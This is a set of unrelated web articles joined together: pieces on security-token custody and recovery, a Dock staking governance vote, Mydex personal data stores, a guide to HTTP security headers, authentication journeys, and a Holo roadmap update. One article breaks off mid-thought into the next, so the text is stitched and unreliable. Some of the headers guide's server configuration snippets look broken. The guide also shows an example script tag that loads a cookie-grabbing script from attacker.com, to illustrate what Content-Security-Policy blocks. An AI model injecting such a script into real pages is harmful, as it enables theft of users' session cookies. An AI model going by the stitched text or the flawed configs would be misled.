			<p>The digital asset space continues to thrive and attract institutional investors, as according to PitchBook, <a href="https://www.bloomberg.com/news/articles/2021-06-18/venture-capital-makes-a-record-17-billion-bet-on-crypto-world?sref=3REHEaVI">$17 billion worth of institutional capital</a> has poured into the sector this year alone. Moreover, <a href="https://www.bloomberg.com/news/articles/2021-06-18/venture-capital-makes-a-record-17-billion-bet-on-crypto-world?sref=3REHEaVI">70% of institutional investors expect to invest in digital assets</a> in the future. Since the funding in the space has exploded, traditional custodians are trying to figure out how they fit in as new players on this value chain. Custodian banks have been slow to adapt and are now struggling with managing digital asset custody. Even worse, they mix up crypto-currencies and tokenized financial securities.</p>
 Digital assets: new opportunities for custodians 
<p>It is natural that custodians need time to understand how blockchain technology works. Once that happens, the lucrative opportunities that await on the other side will become clear. Here, we listed a few benefits and opportunities:</p>
 
 New safekeeping service<br>
 
 
<p>As digital wallets are the access points for digital assets, custodians can provide custodial wallets for investors.</p>
 
 Reduced operational costs<br>
 
 
<p>When all investor positions are kept on the blockchain, it eliminates the need for reconciliation of depository in the process. This reduces the heavy reconciliation costs.</p>
 
 Immediate services<br>
 
 
<p>Custodians can provide immediate value-added services such as owning the recovery process for lost security tokens, reporting, tax certification, lending services and other collateral management services to investors.</p>
<p>We used the word ‘immediate’ because with the blockchain, processing these services will use a single truth of information. Issuers, agents and investors can access the real-time data at any time. Services can be provided promptly by avoiding the lengthy process of flowing information throughout the traditional chain of custody and the risk of human errors.</p>
 The main challenge is not regulation but the adoption of the new model&nbsp; 
<p>People often think the main challenge in this space is regulation, but it is actually not true. Instead, the real struggle for financial institutions including custodians is adopting new processes and new tools. When it comes to compliance, it is mostly about verifying the eligibility of investors. This can’t be performed by identifying investor wallets, as they are browsers for the internet of value, not vaults.&nbsp; That is where digital identity comes into play, but how does it work? Let’s take a look at the main characteristics in the blockchain-based model of custody to provide some clarity:</p>
 
 Smart contracts<br>
 
 
<p>The smart contracts represent the asset(s) on the blockchain infrastructure. They code compliance rules into the security tokens, and only eligible investors can hold these tokens. The serious protocols for tokenized securities usually include a token recovery function that can be triggered by authorized agents.</p>
 
 Tokens<br>
 
 
<p>The tokens that have eligibility rules embedded into themselves are permissioned tokens, and they can only be traded between eligible counterparts.</p>
 
 Digital identity 
 
<p>Investors have a digital identity that stores verified identity proofs onchain, and smart contracts can check these proofs to verify the eligibility of investors.</p>
 
 Wallets<br>
 
 
<p>Once the smart contract code confirms the eligibility of the investor, the permissioned tokens will be allocated to wallets associated with the investor’s digital identity. If the private key or access credential is lost, the permissioned tokens can be recoverable to another wallet. This can be processed after the verification of identity by token issuers or third-party agents.</p>
<p>&nbsp;</p>
 Use cases: recovery of security tokens 
<p>It is therefore obvious that custodians need access to the token smart contracts, not to the wallets, for safekeeping investors’ assets. For example, issuers of tokenized securities using the <a href="https://tokeny.com/t-rex/">T-REX Protocol, now recognized as ERC3643 by the Ethereum community,</a> are able to appoint a custodian bank as the recovery agent and grant that bank access to the recovery function of the smart contracts. In practice, the security tokens can be recovered in just a few steps:</p>
 
 Declare the loss of the wallet: The investor creates a request to recover their tokens to the custodian bank. 
 Verify the digital identity – <a href="https://tokeny.com/onchainid/">ONCHAINID</a>: The custodian bank verifies the token holder’s identity with a standardized KYC process to validate the provenance of the request. 
 Recover the same tokens in the new wallet: If the verification is positive, the custodian bank triggers the recovery function and the lost tokens are transferred to the new investor wallet. This new wallet will also be added to the ONCHAINID of the investor. The custodian can perform this operation even if he doesn’t have access to the investor’s wallet. 
 
<p></p>
 Time to embrace and explore the new technology&nbsp; 
<p>Traditional custodians have an important role to play in digital asset custody, but they need an updated approach. There are some quick actors who are already reacting to it and updating their model. Recently, US custodian bank State Street launched a digital finance division to expand into the space. Why? It was because of client demand. Certainly, the demand will continue to increase, and as we mentioned earlier, seven out of ten institutional investors plan to invest in digital assets.</p>
<p>The good thing is that the technology has matured after years of use and securing billions worth of digital assets. Custodians can implement the technology quickly and straightforwardly. It is time to move and keep up with technology in order to gain a competitive advantage, those who react slower risk falling behind the competition, or other new players enter into this space.</p>
<blockquote>
<p>As Nadine Chakar, the lead of the new digital finance division at State Street, said, “This space is evolving at warp speed. I believe the winners will be those who embrace change versus those who stand back and watch – they will be disintermediated or disrupted. Business leaders, including myself, must set the tone that standing still is not an option.”</p>
</blockquote>

<p>A new proposal has been submitted to adjust the staking rewards emissions on the Dock network to a 50/50 split with 50% of emission rewards going to validators and stakers, and 50% going to the Dock Treasury.</p><p>This would increase the amount of staking rewards to validators and stakers who participate in securing the Dock network, who are currently receiving 40% of rewards and reduce the Treasury’s allocation from 60%. The initial division of staking rewards was based on Polkadot’s reward split, but we feel that adjusting to a 50/50 split is a better fit to align incentives across the network, increasing the rewards to validators while adequately funding the Dock Treasury to develop and operate the network.<br><br>This proposal is live on the Dock Network and can be viewed in the Governance portal here: ​​<a href="https://fe.dock.io/#/democracy">https://fe.dock.io/#/democracy</a>. All Dock token holders can vote to influence the outcome of this proposal and should participate in determining this important change to the network.</p> How to vote   Go to the <a href="https://fe.dock.io/#/democracy">Governance portal</a> where you will see the Referendum. Click Vote on the proposed Referendum.  <p>2. 	Select which account you want to use to submit the vote and click 	Aye or Nay. Select a Conviction amount which lets you choose to lock-up tokens in order to put more weight behind your vote. You can also chose to not lock-up your tokens as part of the vote.</p><p>Once the voting period ends as shown in the Governance portal, if the referendum passes, then it will move to be executed by the Association Council. Otherwise, the rewards split will remain as it currently is with a 60/40 split.<br>For assistance with voting on the referendum, please refer to the <a href="https://docs.dock.io/learn/governance/elections-and-voting/proposals">documentation</a> or contact our team at support@dock.io.</p>

<p>We believe individuals should be able to access and use their own data to be able to manage their lives better. Currently, this isn’t possible because every individual’s data is dispersed across dozens (probably over a hundred) different organisations that hold it and don’t make it available. This is absurd and&nbsp;unfair.</p><p>Over the last 14 years we have built the infrastructure needed to make citizen data empowerment possible — infrastructure capable of providing every individual with their own personal data store, where they can safely and securely collect their own data, use it and share it under their own control. This infrastructure is now live and operational, officially recognised as a supplier to public services on procurement platforms in both England and Scotland and independently accredited for data management security under ISO&nbsp;27001.</p> Unleashing the potential <p>But what we’ve also learned over these 14 years is that core infrastructure is not enough. A parallel: it is extraordinary and wonderful that we have water infrastructure that brings fresh, safe water to our homes and offices, and a national grid that does the same with electricity. But if we didn’t have taps and switches to turn the water and electricity on and off as and when we need them, they wouldn’t be half as valuable as they&nbsp;are.</p><p>So, over the past few years, we’ve also been building the taps and switches that are needed to make our citizen empowering personal data logistics infrastructure really useful. This blog outlines some of&nbsp;them.</p> Smart directories <p>One of the really big, time consuming, frustrating and expensive things every individual and every organisation has to contend with is what we call ‘matching and connecting’. Individuals want to find the services they need to help them with a particular task, but often they don’t know who they are or where to find them. They might not even know that such services exist. Likewise, organisations offering a particular service often struggle to find and reach the particular people who really want or need this&nbsp;service.</p><p>A huge amount of time, money and effort is wasted by both individuals and organisations trying to solve these puzzles, often in expensive and unsatisfactory ways.</p><p>With smart directories, individuals can allow selected organisations to see an anonymised profile of themselves (shorn of any data that would identify the particular individual), and the selected organisations can see whether individuals fit the criteria their service is designed for. If there is a fit, the organisation can use the platform to send a message to the individual. If the individual decides to accept the message and respond, a connection is established.</p><p>Smart Directories lie at the heart of <a href="https://medium.com/mydex/supporting-citizen-participation-in-the-design-of-public-services-d3a56e6aa97">the work we are currently doing</a> with the <a href="https://blogs.gov.scot/digital/tag/office-of-the-chief-designer/">Office of the Chief Designer in Scotland</a> and <a href="https://connecting.scot/">Connecting Scotland</a> to radically reduce the costs of finding and working with citizens to help co-design public services.</p> Automated form&nbsp;filling <p>There is little more dispiriting and irritating than having to fill in forms, especially when you have to do it time and time again, providing the same information to different people. Using our platform and its ability to enable the sharing of <a href="https://medium.com/mydex/proving-verified-attributes-work-3f9ca813d43f">verified attributes</a> in particular, if an individual says ‘Yes, I would like this service’ it is possible for the necessary information (and only the necessary information) to be automatically sucked out of their PDS and sent to the service provider so that service provider doesn’t have to waste time, money and effort checking to see if it is&nbsp;correct.</p><p>This eliminates friction, effort, risk and cost for both sides while radically speeding up the process. Using our infrastructure, what used to take weeks or months (the individual painstakingly and manually filling out a form; the organisation painstakingly checking every piece of information within the form — often having to pay external service providers for the privilege), can now take&nbsp;minutes.</p><p>This approach is central to the Scottish Government’s planned <a href="https://digitalscot.net/courses/digital-government/lessons/digital-identity/topic/digital-identity-scotland-scottish-attribute-provider-service/">Scottish Attribute Provider Service</a>, which could revolutionise both citizens’ experience of accessing and using public services in Scotland and the costs these services&nbsp;incur.</p> Circles <p>In many service situations, different groups of people need to talk to each other to make arrangements, coordinate diaries, deal with changes, share results of meetings, organise follow ups, and so on. Often this is done by phone or email where the information gets lost or becomes difficult to find and where separate processes are then needed to share associated data.</p><p>To address this need, we have created what we call ‘Circle’ capabilities by which an individual can create a specific circle of contacts for a particular need (a bit like a WhatsApp group) but where a) all data generated by the conversation is automatically recorded into the individual’s PDS and b) where if related information needs to be shared it can be, automatically, again via the individual’s PDS.</p><p>Individuals having to manage their cancer journeys provide a good example. Each cancer journey requires a lot of organisation and coordination, with different groups of people for different purposes. For example, the patient will need to arrange and attend appointments and share clinical data with medics; to coordinate arrangements with carers (both paid and unpaid); to manage related domestic arrangements with friends and family (can someone walk the dog while I’m recovering from chemo?); and to connect with specialist service providers.</p><p>In our work with <a href="https://medium.com/macmillan-my-data-store-pilot">Macmillan My Data Store</a>, we have created specific Circles (e.g. for friends and family or small service providers) where all of these tasks can be undertaken safely and efficiently, thereby lifting an energy and emotional burden off cancer patients while helping service providers work more productively.</p><p>The same core technologies are now also being used in the <a href="https://medium.com/mydex/revolutionising-healthy-ageing-200a7edd1016">Revolutionising Healthy Ageing</a> project, where multiple different service providers need to come together to create an integrated, joined-up service for citizens that deals safely and respectfully with multiple aspects of their&nbsp;lives.</p> Web apps <p>For services like these to work, people and the services they engage with need an interface. Traditionally, this interface has been provided by a single, isolated service provider via their website or app. But this requires individuals to sign in to each particular service and doesn’t enable dots to be joined between different providers. And if it’s an app, it creates a new dependency on Silicon Valley monopolists like Google and Apple with their app stores, while requiring that the individual has a smart&nbsp;device.</p><p>What’s more, the interface acts as a data suction device — sucking the user’s data into the systems of the app provider. In other words, the current approach is not only not inclusive, inefficient and restrictive, it is also privacy invading. Our answer: our web&nbsp;apps.</p><p>Web apps can be used on any device connected to the Internet, independently of the Silicon Valley monopolists’ app stores. Our architecture for web apps goes further, placing data that is generated in the individuals’ own personal data&nbsp;store.</p><p>And there is something else. With our Web Apps front line service providers (who know each step of a process inside out) can map each of these steps out, identifying exactly what information needs to be shared when, to create a seamless journey. We have developed the technology by which the resulting interface — the App itself — is generated without the front line service providers having to know anything about software or code. This means the people who really know what each service needs can quickly and easily generate interfaces with service users, as and when they need&nbsp;them.</p><p>With each Web App directly linked to the individual’s PDS, any information that needs to be shared (for example, a form needing to be completed) can be automatically sucked out of the PDS. This makes access to service modules like Smart Directories and Automated Form Filling instant and&nbsp;easy.</p> Citizen Co-design <p>For any service to be really useful, the most important input is that of the user — because users are the only people who really know what it feels like to use a&nbsp;service.</p><p>Every service module we develop — including all of the above — has been developed working with citizens who actually use the service. We have developed skills and processes to facilitate this and we are continuing to research how to best engage with citizens to really make their contributions easy, fulfilling, informative and actionable. This is part of the work we are doing on <a href="https://medium.com/mydex/supporting-citizen-participation-in-the-design-of-public-services-d3a56e6aa97">co-design of public services</a> discussed above.</p> Our Inclued&nbsp;platform <p>Many service providers don’t need just one of the above. They need them all — and more. They need channels to communicate and engage with citizens, to send and receive messages and to integrate that ability to act on these messages.</p><p>Working with Glasgow City Council we have built a platform, called <a href="https://mydex.org/platform-services/#inclued">Inclued</a>, which does all these things. Using Inclued, the Council can use the above capabilities to present citizens with incentives and offers, create communities, and seek feedback or direct engagement to gain insights and improve the targeting of their services. Inclued also eradicates form filling through secure, informed data sharing. Inclued is now being used as part of <a href="https://medium.com/mydex/supporting-citizen-participation-in-the-design-of-public-services-d3a56e6aa97">our work with the Scottish Government</a> and Connecting Scotland and our work with <a href="https://medium.com/mydex/revolutionising-healthy-ageing-200a7edd1016">Blackwood Homes and Care</a> as part of the three year programme with three local communities working on Healthy&nbsp;Ageing.</p> Consent Management Dashboards <p>For all of the above to work — for citizens to remain in control of their data and to have continued trust and confidence in what’s happening — they need quick, easy, simple ways to see which service provider has had access to what information, for what purposes. They need tools which enable them to make changes — such as withdrawing consent — when and if they want to; and to exercise their rights under data protection legislation if&nbsp;needed.</p><p>Currently this is practically impossible. Most of us have data sharing relationships with over 100 organisations (across health, financial services, public administration, education skills and employment, travel, retail, leisure, media and so on). Currently, to do anything relating to data with them, we have to jump through hoops, signing in to each different organisation’s website or app, navigating our way through to MyAccount, scrolling through Settings and so&nbsp;on.</p><p>The costs and hassle of doing this in a consistent way across 100 or more different relationships are so prohibitively high that hardly anyone bothers. What we have today is an entire data ecosystem and economy built on learned citizen helplessness — the realisation that exercising genuine control over your own data is such a vast, time consuming, hasslesome task that it’s not worth even&nbsp;trying.</p><p>We are changing that by building consent management dashboards that enable citizens to see and manage all their data relationships simply, quickly and easily from one place within their PDS. This includes the ability to create general permission and consent settings. What if, for example, instead of being confronted with a separate, different pop-up each time you visit a web site to set permissions for cookies, your PDS could instantly inform the web site that (for example) ‘I am happy with cookies for performance analytics but not for third party advertising).</p><p>Our consent management dashboard is still work in progress. There are still many bits of functionality that need to be built. But the core is there, working to support all of the above service&nbsp;modules.</p> Summary <p>Giving individuals the means to exercise control over their data — to be able to access and use their own data for their own purposes — is easy to say but hard to&nbsp;do.</p><p>Doing it in a way that also helps service providers benefit from citizen empowerment adds another level of challenge.</p><p>We’re not finished with this task by any means. But we have made a good start. Many core capabilities and functions are built and already adding value for both citizens and bona fide service providers. We’ve got many more in the pipeline.</p><p>The opportunity to unleash the full personal, social and economic potential of personal data is immense. And we are now on our&nbsp;way.</p><p>However, for all these services to be truly valuable they have to demonstrate built-in integrity.

 The Security Headers 

<p>HTTP security headers are HTTP response headers designed to enhance the security of a site. They instruct browsers on how to behave and prevent them from executing vulnerabilities that would endanger your users.</p>

 HTTP Strict Transport Security (HSTS) 

<p>First, the Strict-Transport-Security header forces the browser to communicate with HTTPS instead of HTTP. HTTPS is the encrypted version of the HTTP protocol. Strictly using HTTPS can prevent most man-in-the-middle and session hijacking attacks.</p>

<p>This header has two configuration options: <code>max-age</code> and <code>includeSubDomains</code>. <code>max-age</code> is the number of seconds the browser should remember this setting. And if <code>includeSubDomains</code> is selected, the settings will apply to any subdomains of the site as well.</p>

   <code>Strict-Transport-Security: max-age=31536000 ; includeSubDomains
</code>   

<p>Ideally, this header should be set on all pages of the site to force browsers to use HTTPS.</p>

 Content-Security-Policy (CSP) 

<p>The Content-Security-Policy header controls which resource the browser is allowed to load for the page. For example, servers can restrict the scripts browsers use to a few trusted origins. This prevents some cross-site scripting attacks that load scripts from a malicious domain.</p>

   <code>&lt;script src="attacker.com/cookie_grabber.js"&gt;&lt;/script&gt;
</code>   

<p>There are many different directives of the policy, but the most important one is <code>script-src</code>, which defines where scripts can be loaded from. Other directives include <code>default-src</code>, <code>object-src</code>, <code>img-src</code>, and more. You can define a policy using the” header syntax:</p>

   <code>Content-Security-Policy: RESOURCE-TYPE ORIGIN ORIGIN ORIGIN ...
</code>   

<p>For example, this policy limits the source of scripts to the current domain, and “www.okta.com”. <code>self</code> represents the current domain.</p>

   <code>Content-Security-Policy: script-src 'self' https://www.okta.com
</code>   

<p>The <code>default-src</code> directive defines the policy for any resource that does not already have a policy. For example, this policy tells the browsers that all scripts should come from subdomains of “okta.com”, and all other resources should only load from the current domain.</p>

   <code>Content-Security-Policy: default-src 'self'; script-src https://*.okta.com
</code>   

 X-XSS-Protection 

<p>This header controls the XSS auditor on the user’s browser. There are four options for this header.</p>

   <code>X-XSS-Protection: 0 (Turns off XSS Auditor)
X-XSS-Protection: 1 (Turns on XSS Auditor)

X-XSS-Protection: 1; mode=block (Turns on XSS Auditor, prevents rendering the page when an attack is detected)

X-XSS-Protection: 1; report=REPORT_URI (Sanitizes the page and sends a report to the report URL when an attack is detected)
</code>   

<p>XSS auditors are built-in XSS filters implemented by some browsers. However, they are not a reliable way to protect your site against XSS attacks. Many browsers have removed their built-in XSS auditor because they can help attackers bypass XSS controls implemented by websites.</p>

<p>The current best practice is turning the XSS auditor off and implementing comprehensive XSS protection on the server side.</p>

   <code>X-XSS-Protection: 0
</code>   

 X-Frame-Options 

<p>The X-Frame-Options header prevents clickjacking attacks. Clickjacking is an attack in which attackers frame the victim site as a transparent layer on a malicious page to trick users into executing unwanted actions.</p>

<p>This header instructs the browser whether the page’s contents can be rendered in an iframe. There are three options: <code>DENY</code>, <code>SAMEORIGIN</code>, and <code>ALLOW-FROM</code>.</p>

   <code>X-Frame-Options: DENY (Page cannot be framed)

X-Frame-Options: SAMEORIGIN (Allow framing from pages of the same origin: same protocol, host, and port)

X-Frame-Options: ALLOW-FROM https://google.com (Allow framing from specified domain)
</code>   

<p>One of these options should be set on all pages that contain state-changing actions.</p>

 Referrer-Policy 

<p>The Referrer-Policy header tells the browser when to send Referrer information. This can help prevent information leakages offsite via Referrer URLs. There are many options for this header, the most useful ones being <code>no-referrer</code>, <code>origin</code>, <code>origin-when-cross-origin</code>, and <code>same-origin</code>. Note that “referrer” is not misspelled in this header like it is <a href="https://en.wikipedia.org/wiki/HTTP_referer">in HTTP’s “Referer”</a>!</p>

   <code>Referrer-Policy: no-referrer (Do not send referer)

Referrer-Policy: origin (Send the origin, no path or parameters)

Referrer-Policy: origin-when-cross-origin (Send the origin when the destination is offsite, otherwise, send entire referer)

Referrer-Policy: same-origin (Send referer when the destination is of the same origin, otherwise, send no referer)
</code>   

<p>You should consider using one of the above options as your Referrer-Policy header. They all protect against user info leaks in a referer path or parameter. In addition to setting the correct Referrer-Policy header, you should also avoid transporting sensitive information in URLs if possible.</p>

 X-Content-Type-Options 

<p>This header prevents MIME-sniffing. MIME-sniffing is when browsers try to determine the document’s file type by examining its content and disregarding the server’s instructions set in the Content-Type header.</p>

<p>MIME-sniffing is a useful feature but can lead to vulnerabilities. For example, an attacker can upload a JavaScript file with the extension of an image file. When others try to view the image, their browsers detect that the file is a JavaScript file and execute it instead of rendering it as an image. Setting this header to <code>nosniff</code> will prevent MIME-sniffing.</p>

   <code>X-Content-Type-Options: nosniff
</code>   

<p>Ideally, this header should be set for all content so that your website can decide how the browser renders files by setting the Content-Type response header. You could also use a separate subdomain to host user-uploaded content to prevent potential XSS attacks on the main domain.</p>

 Permissions-Policy 

<p>The Permissions-Policy header lets you enable and disable browser features. For example, you can control whether the current page and any pages it embeds have access to the user’s camera, microphone, and speaker. This allows developers to build sites that protect users’ privacy and security. The Permissions-Policy header looks like this.</p>

   <code>Permissions-Policy: FEATURE ORIGIN; FEATURE ORIGIN

Permissions-Policy: microphone=(), camera=()
There are three options for the allowed ORIGINs of each feature.
Permissions-Policy: microphone=(*) (Microphone will be allowed in this page and all framed pages)

Permissions-Policy: microphone=(self) (Microphone will be allowed in this page and all framed pages if same origin)

Permissions-Policy: microphone=() (Microphone will be disallowed in this page and all framed pages)
</code>   

<p>You can also specify the specific domain where the feature is allowed:</p>

   <code>Permissions-Policy: microphone=(self "https://example.com")
</code>   

<p>You can configure these directories according to your needs. It’s a good idea to place some control over the features that your iframes can access.</p>

 Configuring a Security Header 

<p>After you’ve determined which headers to use, you can configure your server to send them with HTTP responses.</p>

 Nginx 

<p>In Nginx, you can add a header by adding these lines to your site’s configuration.</p>

   <code>add_header X-Frame-Options SAMEORIGIN always;
add_header Content-Security-Policy "default-src 'self' https://*.okta.com";
add_header Permissions-Policy microphone=()
</code>   

 Apache 

<p>In Apache, the syntax is similar.</p>

   <code>Header always set X-Frame-Options "SAMEORIGIN"
Header set Content-Security-Policy "default-src 'self' https://*.okta.com";
Header always set "microphone 'none'; camera 'none'";
</code>   

 IIS 

<p>Finally, you can configure headers in IIS by adding custom headers to your site’s configuration file.</p>

   <code>&lt;configuration&gt;
   &lt;system.webServer&gt;
      &lt;httpProtocol&gt;
         &lt;customHeaders&gt;
            &lt;add name="X-Frame-Options" value="SAMEORIGIN" /&gt;
            &lt;add name="X-XSS-Protection" value="0" /&gt;
         &lt;/customHeaders&gt;
      &lt;/httpProtocol&gt;
   &lt;/system.webServer&gt;
&lt;/configuration&gt;
</code>   

 Firebase 

<p>Major cloud providers also give you options to customize the security headers you use. For instance, if you use Firebase, you can add security headers into the <code>firebase.json</code> file. Add a <code>headers</code> key to the JSON file with the security headers you want to add as its values:</p>

   <code>"headers": [
    { "key": "Permissions-Policy",
      "value": "microphone=(), camera=()"
    },
    {"key": "X-Frame-Options",
      "value": "DENY"
    }
]
</code>

<p>The 2020 pandemic and resulting work-from-home experience yielded an important conclusion regarding cybersecurity: identity is the new perimeter. Sixty-three percent of all data breaches exploit weak credentials, and incidents like SolarWinds highlight the need to focus cybersecurity on identity and access management (IAM) systems. Many organizations used the pandemic to accelerate their digital transformation projects with a focus on identity, but met additional challenges such as:</p>



<p>Bring-Your-Own-Device (BYOD): employees (new and existing), contractors, and freelancers require flexibility regarding the types of devices used and their capabilities to ensure proper identity verification, authentication, and credential storage.</p>



<p>Passwordless authentication: some devices are capable of securely storing credentials that can be used for proof-of-possession by an individual. This can be a convenience and productivity boost and reduce cybersecurity risks.</p>



<p>Biometrics: with new use cases for remote identity verification, and to further ensure proper identity binding to device-based credentials, biometrics can be combined with proof-of-possession to enable passwordless authentication.</p>



<p>Software-defined perimeters: in addition to or instead of virtual private networks (VPNs), multiple authentication flows can be combined to secure authorized access to specific resources within a perimeter. This can prevent data breaches, even in cases of VPN compromise (as in the SolarWinds attack), while enabling fine-grain audit for data protection compliance.</p>



<p>These challenges can make digital transformation a daunting challenge for many CISO and IT managers already under pressure to maintain their status quo password-based IAM systems. Luckily, the new concept of “auth journeys” lets them move beyond the limitations and complexities of existing AD and LDAP-based approaches. “Auth journeys” combine both authentication (authn) and authorization (authz) into processes defined at the user experience (UX) level instead of low-level auth protocols like OAuth, OIDC, SAML, etc.</p>



<p>An authentication journey is a workflow comprised of multiple steps in authentication and authorization processes available within an enterprise. Such steps include multi-factor authentication (MFA), biometrics, geolocation, PIN, credential checks, and even traditional methods (e.g., username &amp; password). Most IAM systems are never fully replaced but include old and new systems and are carefully migrated over rollout periods that last weeks or months. Journeys provide a mechanism to define rollouts, migrations, deprecated methods, upgrades, and credential recovery paths. Journeys are full lifecycle processes that include onboarding, offboarding and internal steps like Active Directory conditional access checks. IT departments can define minimal journeys for all users, specific roles, and then let users choose their own devices and options for MFA via self-service portals, which allows convenience for users. Some additional benefits of authentication journeys include:</p>



  Compliance &amp; auditing: KYC/AML laws vary globally, so journeys can be customized as remote onboarding becomes more widespread. Onboarding processes can be assessed at various IAL levels and resulting credentials tied to auth processes to directly link the IAL and AAL levels. If logging is part of the journey (as an internal step), auditing can be directly associated with both onboarding and auth processes.  



  Reduction in costs &amp; complexity: A wealth of powerful and effective authentication and authorization technologies are available in the market, but most are complex to manage from a system-level perspective. The security context is lost when dealing with sessions, roles, tokens, and other protocol-specific mechanisms at a low-level of process programming. By managing journeys as high-level definitions of authn and authz processes, CISOs can elevate management of access risks of associated resources above the machine-level programming of OIDC and JWT tokens used to implement such processes.  



  Better vulnerability management: explicit auditing, vulnerability analysis, threat modeling and accessibility enablement that actually improves security and reduces help desk password-reset costs. As in the cyber world, IAM vulnerabilities should be managed, shared and fixed at the journey level, not at the level of a specific protocol implementing a security policy incorrectly.  



  Credential-based onboarding and authorization: new verifiable credentials permit on-demand provisioning for new employees, contract and temporary freelancers who can present such trusted credentials upon signup instead of requiring out-of-band, a prior enrollment in AD/LAP registries. Such credentials, which have expiration dates and explicit privileges, can also encapsulate capabilities to be used in authorization flows.  



  FIDO: allows storage of encrypted credentials across many devices and modalities including security keys, biometrics, mobile phones, tablets, laptops and desktops with a password. FIDO allows developers to focus on high-level journeys in the IAM perimeter while providing device and security policy options.  



  Privacy, Accessibility, Inclusion and Diversity: Ultimately, such flexibility regarding authentication journeys allows each user to choose their own devices, biometric modalities, and credentials for access to specific resources within their enterprises. Such flexibility enables new paths that help protect user privacy, enable accessibility, and promote inclusion and diversity.  



<p>Journeys let users define their own authentication methods that comply with GRC (Governance, Risk &amp; Compliance) requirements while making choices explicit for IT managers. The IAM (Identity &amp; Access Management) landscape may seem to be getting more complex, but only because we’re trying to fit a square peg in a round hole. Old methods tied strictly to AD and LDAP registries with groups and their associated roles are only a narrow keyhole from the past into which we can view a broader IAM future. These systems will continue to be used in many enterprises but form only part of the many journeys available to users within the new IAM landscape.</p>

<p>It wasn’t long ago that the word ‘fungibility’ was but an obscure term understood only by economists and asset and commodity traders. Fewer even know that this peculiar word derives from the Latin verb fungi, meaning ‘to perform.’ From these arcane origins, the word is everywhere today, thanks to the meteoric rise to popularity of non-fungible tokens (NFTs), those little nuggets that can turn...</p>

 Lead/Org Update <p>You may have noticed an <a href="https://medium.com/h-o-l-o/monthly-roundup-for-holo-holochain-99a372802e2a">uptick</a> in stories, blogs, apps, news and announcements coming from Holo recently. In large part this is simply because there is much more that can be built on Holochain than ever before. The proof of this reality is that the wider community of projects and developers are beginning to move with haste in their respective projects. Simultaneously the Holo development team is now unblocked. Certain feature development had been on pause until Holochain had finished updating to a necessary level of features and stability. This is&nbsp;huge.</p><p>In order to make the sequencing of our interdependent work more visible to our community, we refreshed <a href="https://holo.host/roadmap/">our roadmap for Holo</a> and included some key Holochain releases.</p> Milestones Clarity Tied to Weekly&nbsp;Updates <p>We’ve renamed a few milestones for clarity but mostly we’ve included additional milestones to be able to more effectively tie our regular development updates to the milestones so that everyone can better understand where we&nbsp;are.</p><p>You will notice that we now have 9 of the Phase 3 milestones completed. An additional 7 of the milestones are what we call our work in progress, each of which is focused on by a specific sub-team. Every week, across the board, we are delivering features into test networks, usable builds for our community, and public releases.</p> Sharding Ready for Developers <p>In the past month the Holochain team released what we call the “Sharding Ready” release. If you are looking at it on Github, it is the release that is numbered 0.0.107. They have since delivered two additional releases that solidify and make those fundamental changes usable by community developers and by the Holo team. These releases of Holochain are precisely what the participants of the Dev Camp are using now for building, testing and deploying their own Holochain applications.</p> New Tools Make Rapid App Development Possible <p>Some amazing tools have also been made available on the tails of the Holochain release. The Launcher, our scaffolding tool, and the Dev Hub all make it easier for developers to adopt Holochain by saving them work and shortening their learning&nbsp;curve.</p><p>The Holochain Launcher is a dashboard that allows end users to install and run Holochain applications locally. This means that Holochain apps are easy to demo, easy to configure for testing by QA teams and community members — and ultimately easy for non-technical users to simply install and begin running on their own computers.</p><p>The scaffolding tool is the first in a set of Rapid Application Development tools — what’s known in the software world as RAD tools. The scaffolding tool provides a kickstart to the process of building an application. It allows new developers to lean on patterns that other more established Holochain developers have designed. It will also let non-developers who are members of product teams use business terms and logic for setting up the basics of an application. For example, if you are designing a blog, the scaffolding tool is where you would define concepts like a post and a list of&nbsp;posts.</p> Dev Campers Show RAD Tools&nbsp;Working <p>Session 3 of Dev Camp is where they introduced the RAD scaffolding tool to the participants and then assigned homework to participants to scaffold their first Holochain application. After that they will package the application and then run it from inside the Launcher.</p> DevHub Makes hApps Testable, Available to&nbsp;Devs <p>The DevHub is another tool that is being tested by a few of our community developers now. It’s a developer console where hApps are uploaded and tested, and where they will be reviewed/rated by other ecosystem developers. This component is critical to Holo in the sense that our Publisher Portal will look to it as the source for all Holochain applications that can be published to the Holo network for&nbsp;hosting.</p> Work in&nbsp;Progress <p>This week our team just finished getting all the various applications and services related to the Holo Platform updated to the Sharding Ready release of Holochain. This means that now Holo hApps and Infrastructure are working with a version of Holochain that exceeds all of our prior baseline performance metrics as compared to the previous releases of Elemental Chat.</p><p>There is so much underway — so we’ve added a small overlay to the roadmap that shows the following parts we are already working&nbsp;on.</p> Next Up: Elemental Chat Public Release (still just a Prototype) <p>Yes, with the performance gains with Holochain, we’re now preparing to let people use Elemental Chat on Holo. We’re working through testing and release processes now so stay tuned for announcements.</p> Publisher Portal &amp; HoloFuel Readying for Pre-Release Testing <p>The Holo team is steadily working on the first pre-release of the Publisher Portal as well as a release of the HoloFuel app with basic transactions of Test Fuel. Development on these two applications had paused previously because certain features required changes in Holochain that are now available with the recent Holochain update.</p> Holochain 0.1.x HDK&nbsp;Release <p>Holochain is preparing to do their first bump to a 0.1.x release. This indicates a greater level of usability and reliability. Our release numbering is based on the standard of <a href="https://semver.org/">Semantic Versioning</a>, where the first number is a major release, the second is a minor release and the third is a patch. Each time a project moves over one decimal in a startup project, it is a milestone worth celebrating as it typically indicates increased stability and documentation for the developers who are dependent on the&nbsp;project.</p> HoloPort Registration Useability <p>Another effort currenlty underway in the Holo team is the new key generation process for HoloPorts. This work will revise the current HoloPort Registration process, adding in critical steps for security as well as making the process more extensible for both our operations team and for the hosts who are registering. This will specifically set us up to build other features required for beta like multi-port registration and identity verification.</p> Wrapping it up with Community &amp; Customer&nbsp;Service <p>As we move forward today we are entering a period of increased complexity for our Community and Customer Support folks. For most of our Dev cycles up until now, we’ve had two sets of users — Hosts and Holochain developers. Others who follow the project have wanted to know what is possible with this new tech, what is available and how it works, and many others have wanted to better understand how it all relates to our token and eventually HoloFuel. This past month, however, saw us push forward to have multiple new tools and applications that are being used by many more developers and now also the end users of the applications those developers have&nbsp;built.</p><p>This means that non developers are asking more questions on our support channels and forums. This will only increase as we do pre-releases of HoloFuel and the Publisher Portal and as other projects make more and more Holochain apps available on the Launcher. We’re going to be working diligently with the community on ways to direct those questions to all the right&nbsp;places.</p><p>So thank you for all the interest and engagement — and a special thanks too for your patience as we stretch and evolve through these wonderful growing&nbsp;pains.</p><p>-Mary</p> <p><a href="https://medium.com/h-o-l-o/q4-2021-update-on-milestones-and-progress-27eb0b0b7e5a">Q4 2021: Update on Milestones and 